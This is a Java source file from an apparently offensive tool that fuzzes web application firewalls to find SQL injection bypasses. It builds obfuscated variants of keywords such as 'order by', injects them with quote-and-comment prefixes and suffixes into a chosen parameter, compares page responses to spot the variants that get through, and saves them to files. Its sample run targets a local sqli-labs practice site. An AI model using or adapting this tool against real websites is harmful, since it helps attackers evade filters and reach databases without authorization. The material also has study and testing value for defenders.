package com.sqldd.fuzzingWaf;
import com.sqldd.fuzzingWaf.utils.BypassTxtOprator;
import com.sqldd.fuzzingWaf.utils.DoubleCharBypass;
import com.sqldd.fuzzingWaf.utils.SimgleCharBypass;
import com.sqldd.payloadOrigin.base.KeywordLib;

import java.util.ArrayList;
import java.util.HashMap;

/**
 * 只是绕过防火墙，保证了关键字不被拦截。
 * 但是可能网站底层还有过滤黑白名单等方法，所以关键字究竟起不起作用，还得具体去测试。
 * 比如order by，就可以通过order by 1得到rate=1，order by 1000得到rate=2来确定。
 * union select 1，2，3得到具体的结果来确定。
 *
 */
public class ByPassRule{
    private String url;
    private String method;
    private String pre;
    private String suf;
    private String sufbk;
    private HashMap<String,String> params = new HashMap<String,String>();//参数
    private String injectingKey;//正在测试的注入点
    private HashMap<String,String> normalparams1 = new HashMap<String,String>();
    private HashMap<String,String> normalparams2 = new HashMap<String,String>();
    private boolean how;//探测规则，返回一个有效bypass，或者所有有效bypass

    public ByPassRule(String url,String method, String pre, String suf,String sufbk, HashMap<String, String> params, String injectingKey,HashMap<String,String> normalparams1,HashMap<String,String> normalparams2,boolean how){
        this.url = url;
        this.method = method;
        this.pre = pre;
        this.suf = suf;
        this.sufbk = sufbk;
        this.params = params;
        this.injectingKey = injectingKey;
        this.normalparams1 = normalparams1;
        this.normalparams2 = normalparams2;
        this.how = how;
    }

    public ArrayList<String> getNormalRsts(){
        System.out.println("获取正常页面值");
        //正常页面
        PageComparison pageComparison = new PageComparison(this.url,this.method);
        ArrayList<String> normalRst = pageComparison.getNormalPageComparison(normalparams1, normalparams2);

        return normalRst;
    }

    /**
     * 传入的参数有三种情况：单关键字和两个关键字，和一个句子组合+一个关键字。分别绕过
     */

    /**
     * 一个关键字
     * @param keyword 关键字
     * @return
     */
    public boolean bypassSingleChar(String keyword){
        ArrayList<String> rsts = new ArrayList<>();
        ArrayList<String> rstsStore = new ArrayList<>();
        PageComparison pageComparison = new PageComparison(this.url,this.method);

        SimgleCharBypass simgleCharBypass = new SimgleCharBypass();
        ArrayList<String> allBypassS = simgleCharBypass.getAllBypass(keyword);
        ArrayList<String> normalRsts = getNormalRsts();
        for (String bypass : allBypassS) {
            params.put(injectingKey, bypass);
            int rate = pageComparison.getRate(normalRsts, params);
            if(rate != 3){
                rsts.add(bypass);
                //存档
                StringBuilder builder = new StringBuilder(bypass);
                if(bypass.indexOf(keyword) > 0){
                    System.out.println(bypass.indexOf(keyword) + keyword.length());
                    builder.replace(builder.indexOf(keyword), builder.indexOf(keyword)+keyword.length(), ".");
                    System.out.println("[bypass:"+keyword+"]有效!:" + builder.toString());
                    rstsStore.add(builder.toString());
                }
            }
        }
        //how==false不需存档，为true，存档
        if(rstsStore!=null){
            BypassTxtOprator bypassTxtOprator = new BypassTxtOprator();
            bypassTxtOprator.storeBypassInTxt(url, "simgle",rstsStore);
            return true;
        }
        return false;
    }

    /**
     * 两个关键字
     * @param keyword1 第一个关键字
     * @param keyword2 第二个关键字
     * @return
     */
    public ArrayList<String> bypassDoubleChar(String keyword1,String keyword2){
        ArrayList<String> rsts = new ArrayList<>();
        ArrayList<String> rstsStore = new ArrayList<>();
        PageComparison pageComparison = new PageComparison(this.url,this.method);

        DoubleCharBypass doubleCharBypass = new DoubleCharBypass();
        ArrayList<String> doubleCharacterBypass = doubleCharBypass.doubleCharacterBypass(keyword1, keyword2);
        ArrayList<String> normalRsts = getNormalRsts();
        for (String bypass : doubleCharacterBypass) {
            params.put(injectingKey, bypass);
            int rate = pageComparison.getRate(normalRsts, params);
            if(rate != 3){
                rsts.add(bypass);
                if(how == true){
                    //存档
                    StringBuilder builder = new StringBuilder(bypass);
                    int i = builder.indexOf(keyword1);
                    String s = builder.toString();
                    builder.replace(builder.indexOf(keyword1), builder.indexOf(keyword1)+keyword1.length(), ".");
                    String s1 = builder.toString();
                    builder.replace(builder.indexOf(keyword2), builder.indexOf(keyword2)+keyword2.length(), ".");
                    rstsStore.add(builder.toString());
                }else
                    break;
            }
        }
        //how==false不需存档，为true，存档
        if(how == true){
            BypassTxtOprator bypassTxtOprator = new BypassTxtOprator();
            bypassTxtOprator.storeBypassInTxt(url, "double",rstsStore);
        }
        return rsts;
    }

    /**
     * 两个关键字来作为保存的文件命名
     */
    public ArrayList<String> bypassNamedKeywords(String keyword1,String keyword2){
        ArrayList<String> rsts = new ArrayList<>();
        ArrayList<String> rstsStore = new ArrayList<>();
        PageComparison pageComparison = new PageComparison(this.url,this.method);

        DoubleCharBypass doubleCharBypass = new DoubleCharBypass();
        ArrayList<String> doubleCharacterBypass = doubleCharBypass.doubleCharacterBypass(keyword1, keyword2);
        ArrayList<String> normalRsts = getNormalRsts();
        for (String bypass : doubleCharacterBypass) {
            params.put(injectingKey, bypass);
            int rate = pageComparison.getRate(normalRsts, params);
            if(rate != 3){
                rsts.add(bypass);
                if(how == true){
                    //存档
                    StringBuilder builder = new StringBuilder(bypass);
                    builder.replace(builder.indexOf(keyword1), builder.indexOf(keyword1)+keyword1.length(), ".");
                    builder.replace(builder.indexOf(keyword2), builder.indexOf(keyword2)+keyword2.length(), ".");
                    rstsStore.add(builder.toString());
                }else
                    break;
            }
        }
        //how==false不需存档，为true，存档
        if(how == true){
            BypassTxtOprator bypassTxtOprator = new BypassTxtOprator();
            bypassTxtOprator.storeBypassInTxt(url, keyword1+"_"+keyword2,rstsStore);
        }
        return rsts;
    }

    //order by短，且能有效过滤出可用的payload
    public boolean filterBypassDoubleTypeInclude_Orderby(String nickName){
        ArrayList<String> rstsStore = new ArrayList<>();
        PageComparison pageComparison = new PageComparison(this.url,this.method);

        DoubleCharBypass doubleCharBypass = new DoubleCharBypass();
        ArrayList<String> doubleCharacterBypass = doubleCharBypass.doubleCharacterBypass("order", "by");
        ArrayList<String> normalRsts = getNormalRsts();
        for (String bypass : doubleCharacterBypass) {
            params.put(injectingKey, pre + bypass + " 1"+suf);
            int rate1 = pageComparison.getRate(normalRsts, params);
            params.put(injectingKey, pre + bypass + " "+sufbk+"1");
            int rate11 = pageComparison.getRate(normalRsts, params);
            params.put(injectingKey, pre + bypass + " 1000"+suf);
            int rate2 = pageComparison.getRate(normalRsts, params);
            params.put(injectingKey, pre + bypass + ""+sufbk+"1000");
            int rate22 = pageComparison.getRate(normalRsts, params);
            if((rate1 == 1 || rate11 == 1) && (rate2 == 2 || rate22 == 2)){
                    //存档
                    StringBuilder builder = new StringBuilder(bypass);
                    builder.replace(builder.indexOf("order"), builder.indexOf("order")+"order".length(), ".");
                    builder.replace(builder.indexOf("by"), builder.indexOf("by")+"by".length(), ".");
                    System.out.println("[bypass:order by]有效!:" + builder.toString());
                    rstsStore.add(builder.toString());
            }
        }
        //how==false不需存档，为true，存档
        if(rstsStore != null){
            BypassTxtOprator bypassTxtOprator = new BypassTxtOprator();
            bypassTxtOprator.storeBypassInTxt(url, "order_by_"+nickName,rstsStore);
            return true;
        }
        return false;
    }

    public static void main(String[] args) {
        /*HashMap<String, String> params = new HashMap<String,String>(){{
            put("id", "anyxxx");
        }};
        String injectingKey = "id";
        HashMap<String, String> normalp1 = new HashMap<String,String>(){{
            put("id", "1");
        }};
        HashMap<String, String> normalp2 = new HashMap<String,String>(){{
            put("id", "1");
        }};
        ByPassRule test = new ByPassRule("http://localhost/sqli-labs/Less-1/","get", "1'", "-- ","'", params, injectingKey, normalp1, normalp2,true);//how为true时，自行开启存储
        test.filterBypassDoubleTypeInclude_Orderby();*/
        /*ArrayList<String> strings = test.bypassDoubleChar("order", "by");*/
        //ArrayList<String> arrayList = test.bypassSingleChar("union select");

        HashMap<String, String> params = new HashMap<String,String>(){{
            put("uname", "admin");
            put("passwd", "admin");
            put("submit", "Submit");
        }};
        HashMap<String, String> params1 = new HashMap<String,String>(){{
            put("uname", "admin");
            put("passwd", "admin");
            put("submit", "Submit");
        }};
        HashMap<String, String> params2 = new HashMap<String,String>(){{
            put("uname", "admin1");
            put("passwd", "admin1");
            put("submit", "Submit");
        }};
        ByPassRule test = new ByPassRule("http://localhost/sqli-labs/Less-12/","post", "admin\")", "-- ","(\"", params, "uname", params1, params2,true);//how为true时，自行开启存储
        test.filterBypassDoubleTypeInclude_Orderby("test");
    }
}